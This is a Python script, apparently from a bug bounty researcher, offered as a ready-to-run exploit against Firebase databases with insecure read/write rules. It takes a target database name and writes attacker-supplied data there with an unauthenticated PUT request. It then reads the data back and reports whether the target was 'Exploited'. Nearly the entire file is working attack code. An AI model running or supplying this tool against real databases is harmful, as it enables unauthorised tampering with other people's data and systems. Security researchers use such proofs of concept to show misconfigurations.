# Author:
'''
Muhammad Khizer Javed
Cyber Security Researcher & Bug Bounty Hunter
whoami.securitybreached.org
Updated: 06-05-2024
'''
import requests

print ("""
<============================================================================================================>
||                               \"Firebase Database Permissions Exploit                                     ||
||  Usage   : Provide target DB name, filename to be created, information to write                          ||
||  Blog    : Read Full Blog about                                                                          ||
||  Url     : https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty  ||
||  Info    : This is a simple Python Exploit to Write Data to Insecure/vulnerable firebase databases!      ||
||            Commonly found inside Mobile Apps.                                                            ||
||            If the owner of the app has set the security rules as true for both "read" & "write"          ||
||            an attacker can probably dump the database and write their own data to the firebase database. ||
<============================================================================================================>
""")

line = "<<======================================================================>>"

# Give Data
print ("[>] Input Data for exploit\n")
site = input("[+] Enter firebase Database Name : ")
file = input("[+] Enter filename    : ")
name = input("[+] Enter name        : ")
email= input("[+] Enter email       : ")
website = input("[+] Enter Website     : ")
message = input("[+] Enter A Message   : ")

# Payload
site_url = f"https://{site}.firebaseio.com/{file}.json"
data = {
    "Exploit": "Successful",
    "website": website,
    "email": email,
    "name": name,
    "message": message
}

try:
    response = requests.put(site_url, json=data)
except requests.exceptions.RequestException as e:
    print(f"[x] Error: {e}")
    exit(1)

# Collecting file
print (line)
if response.status_code == 200:
    print ("[*] Exploited\n")
    print (f"File Created: {site_url}\n")
else:
    print ("[*] Not Exploited\n")
    print ("No File Created")

print (line)
print ("""If you get a response 'Permission Denied' with 'Successfully
Exploited' This shows the exploit is written but can't be read.
Verify by visiting the URL""")
print (" ")

# Fetch and print the response
print("[>] Response\n")
try:
    r = requests.get(site_url)
    print (r.text)
except requests.exceptions.RequestException as e:
    print(f"[x] Error: {e}")

print (line)

# Reasoning
if response.status_code == 200:
    print ("[>>] Successfully Exploited")
elif response.status_code == 401:
    print ("[x] Not Exploitable \n[!] Reason: All Permissions Denied")
elif response.status_code == 404:
    print ("[x] Database Not Found \n[!] Reason: Firebase Database Not Found")
else:
    print (f"[x] Unknown Error \n[!] Reason: {response.status_code}\n")
